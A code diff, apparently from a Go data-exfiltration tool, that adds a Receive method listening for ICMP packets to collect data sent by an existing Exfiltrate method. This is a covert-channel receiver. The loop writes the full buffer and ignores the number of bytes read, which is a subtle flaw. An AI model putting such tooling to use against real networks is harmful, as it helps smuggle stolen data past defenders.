@@ -64,3 +64,24 @@ func (e *ICMP) Exfiltrate(data io.Reader, to string) error {
 		}
 	}
 }
+
+func (e *ICMP) Receive(output io.Writer) error {
+	conn, err := icmp.ListenPacket("ip4:icmp", "0.0.0.0")
+	if err != nil {
+		return err
+	}
+	defer conn.Close()
+
+	bytes := make([]byte, ICMP_EXFILTRATOR_CHUNK_SIZE)
+
+	for {
+		_, _, err := conn.ReadFrom(bytes)
+		if err == io.EOF {
+			return nil
+		} else if err != nil {
+			return err
+		}
+
+		output.Write(bytes)
+	}
+}
